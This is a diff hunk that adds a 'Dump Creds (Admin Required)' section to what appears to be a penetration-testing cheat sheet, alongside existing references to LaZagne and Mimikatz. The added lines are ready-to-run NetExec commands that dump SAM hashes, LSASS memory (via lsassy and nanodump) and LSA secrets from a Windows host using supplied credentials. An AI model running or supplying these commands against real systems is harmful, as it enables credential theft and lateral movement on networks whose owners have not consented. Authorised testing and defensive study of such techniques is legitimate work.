@@ -52,6 +52,21 @@ When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/La
 .\lazagne.exe all
 ```
 
+
+### Dump Creds (Admin Required)
+
+```bash
+# dump sam
+nxc smb 10.0.2.6 -u 'abc' -p 'pass' --sam
+
+# dump LSASS
+nxc smb 10.0.2.6 -u 'abc' -p 'pass' -M lsassy
+nxc smb 10.0.2.6 -u 'abc' -p 'pass' -M nanodump
+
+# dump LSA
+nxc smb 10.0.2.6 -u 'abc' -p 'pass' --lsa
+nxc smb 10.0.2.6 -u 'abc' -p 'pass' --lsa secdump
+```
 ### Mimikatz
 
 ```bash
